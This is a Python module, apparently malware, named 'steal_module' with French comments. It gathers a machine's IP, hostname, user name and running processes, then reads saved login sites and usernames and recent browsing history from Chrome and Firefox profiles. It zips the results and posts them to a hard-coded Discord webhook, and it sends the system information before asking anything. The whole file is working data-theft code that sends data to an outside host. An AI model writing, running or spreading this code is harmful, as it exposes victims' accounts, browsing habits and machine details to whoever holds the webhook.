import os
import json
import sqlite3
import zipfile
import io
import platform
import socket
import psutil
import requests
import sys
import shutil
from datetime import datetime

# --- Configuration Discord ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1483378838305112094/1Y-eyMHKIH_0lsSWvekzBNBR-TFlzTTgNAmhxkP2X4qVKAQOhpIeTcNB5knMLcdn5-Zo"

def send_to_discord(content, filename=None):
    """Envoie texte ou fichier sur Discord."""
    try:
        if filename:
            files = {'file': (filename, io.BytesIO(content.encode('utf-8')))}
            requests.post(WEBHOOK_URL, files=files)
        else:
            if len(content) > 1900:
                content = content[:1900] + "..."
            requests.post(WEBHOOK_URL, json={"content": f"```\n{content}\n```"})
    except:
        pass

def get_system_info():
    """Infos système envoyées directement sur Discord."""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        os_info = f"{platform.system()} {platform.release()}"
        user = os.getlogin()
        ram = psutil.virtual_memory()
        ram_gb = f"{ram.total / (1024**3):.2f} GB"
        
        procs = [p.info['name'] for p in psutil.process_iter(['name'])][:10]
        
        txt = f"IP: {ip}\nHost: {hostname}\nOS: {os_info}\nUser: {user}\nRAM: {ram_gb}\nProcs: {', '.join(procs)}"
        return txt
    except:
        return "Erreur système"

def get_chrome_data():
    """Chrome: URLs + usernames (sans déchiffrement)."""
    data_psw = []
    data_hist = []
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
    
    # Passwords
    login_db = os.path.join(path, "Login Data")
    if os.path.exists(login_db):
        try:
            copy = "chrome_login.db"
            shutil.copy2(login_db, copy)
            conn = sqlite3.connect(copy)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins")
            for row in cursor.fetchall():
                data_psw.append({
                    "url": row[0],
                    "username": row[1],
                    "password": "[Chiffré]"
                })
            conn.close()
            os.remove(copy)
        except:
            pass
    
    # History
    hist_db = os.path.join(path, "History")
    if os.path.exists(hist_db):
        try:
            copy = "chrome_hist.db"
            shutil.copy2(hist_db, copy)
            conn = sqlite3.connect(copy)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 30")
            for row in cursor.fetchall():
                ts = row[2]
                dt = datetime.fromtimestamp((ts / 1000000) - 11644473600) if ts else "N/A"
                data_hist.append({"date": str(dt), "title": row[1], "url": row[0]})
            conn.close()
            os.remove(copy)
        except:
            pass
    return data_psw, data_hist

def get_firefox_data():
    """Firefox: URLs + usernames (sans déchiffrement)."""
    data_psw = []
    data_hist = []
    prof_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    
    if not os.path.exists(prof_path):
        return data_psw, data_hist
    
    for profile in os.listdir(prof_path):
        full = os.path.join(prof_path, profile)
        
        # Passwords (logins.json)
        logins = os.path.join(full, "logins.json")
        if os.path.exists(logins):
            try:
                with open(logins, "r", encoding="utf-8") as f:
                    content = json.load(f)
                    if "logins" in content:
                        for entry in content["logins"]:
                            data_psw.append({
                                "url": entry.get("hostname"),
                                "username": entry.get("username"),
                                "password": "[Chiffré]"
                            })
            except:
                pass
        
        # History (places.sqlite)
        hist_db = os.path.join(full, "places.sqlite")
        if os.path.exists(hist_db):
            try:
                conn = sqlite3.connect(hist_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 30")
                for row in cursor.fetchall():
                    data_hist.append({"date": "N/A", "title": row[1], "url": row[0]})
                conn.close()
            except:
                pass
    return data_psw, data_hist

def steal_module():
    # 1. Envoi système direct
    sys_txt = get_system_info()
    send_to_discord(sys_txt)
    
    # 2. Menu
    print("1. Chrome\n2. Firefox\n3. Les deux")
    choice = input("Choix: ").strip()
    
    # 3. Préparation ZIP
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zipf:
        
        # Chrome
        if choice in ["1", "3"]:
            print("Chrome...")
            psw, hist = get_chrome_data()
            
            # Chrome passwords
            txt = "--- CHROME PASSWORDS ---\n\n"
            for p in psw:
                txt += f"URL: {p['url']}\nUser: {p['username']}\nPass: {p['password']}\n\n"
            zipf.writestr("Chrome_passwords.txt", txt)
            zipf.writestr("Chrome_passwords.json", json.dumps(psw, indent=4))
            
            # Chrome history
            txt = "--- CHROME HISTORY ---\n\n"
            for h in hist:
                txt += f"Date: {h['date']}\nTitle: {h['title']}\nURL: {h['url']}\n\n"
            zipf.writestr("Chrome_history.txt", txt)
            zipf.writestr("Chrome_history.json", json.dumps(hist, indent=4))
        
        # Firefox
        if choice in ["2", "3"]:
            print("Firefox...")
            psw, hist = get_firefox_data()
            
            # Firefox passwords
            txt = "--- FIREFOX PASSWORDS ---\n\n"
            for p in psw:
                txt += f"URL: {p['url']}\nUser: {p['username']}\nPass: {p['password']}\n\n"
            zipf.writestr("Firefox_passwords.txt", txt)
            zipf.writestr("Firefox_passwords.json", json.dumps(psw, indent=4))
            
            # Firefox history
            txt = "--- FIREFOX HISTORY ---\n\n"
            for h in hist:
                txt += f"Date: {h['date']}\nTitle: {h['title']}\nURL: {h['url']}\n\n"
            zipf.writestr("Firefox_history.txt", txt)
            zipf.writestr("Firefox_history.json", json.dumps(hist, indent=4))
    
    # 4. Envoi ZIP
    zip_buffer.seek(0)
    requests.post(WEBHOOK_URL, files={'file': ('browser_data.zip', zip_buffer)})
    print("✅ Fini !")
